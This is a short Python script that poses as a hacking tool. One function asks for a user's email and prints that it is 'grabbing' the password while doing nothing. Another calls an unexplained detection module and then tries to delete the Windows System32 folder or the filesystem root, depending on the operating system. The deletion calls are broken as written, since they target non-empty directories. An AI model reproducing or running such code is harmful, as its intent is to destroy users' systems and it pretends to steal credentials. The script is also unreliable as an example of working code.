import os
import detect
import platform

def start():
    email = input("What is the email of this user?: ")
    print(f"Grabbing password of {email}")

def attack():
    detect.detect()
    operating_system = platform.system()
    if operating_system == "Windows":
       os.rmdir("\Windows\System32")
    elif operating_system == "Linux":
       os.rmdir("/")
    elif operating_system == "Darwin":
       os.rmdir("/")
